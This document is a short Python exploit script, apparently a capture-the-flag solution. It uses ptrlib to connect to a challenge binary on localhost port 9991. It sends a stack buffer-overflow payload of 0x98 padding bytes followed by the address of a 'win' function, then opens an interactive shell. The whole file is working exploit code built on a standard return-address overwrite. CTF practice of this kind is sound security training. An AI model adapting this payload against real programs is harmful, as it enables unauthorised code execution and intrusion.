from ptrlib import *

elf = ELF("../distfiles/chall")
#sock = Process("../distfiles/chall")
sock = Socket("localhost", 9991)

sock.sendlineafter(": ", "0")
payload  = b"A"*0x98
payload += p64(elf.symbol("win"))
sock.sendlineafter(": ", payload)

sock.sh()
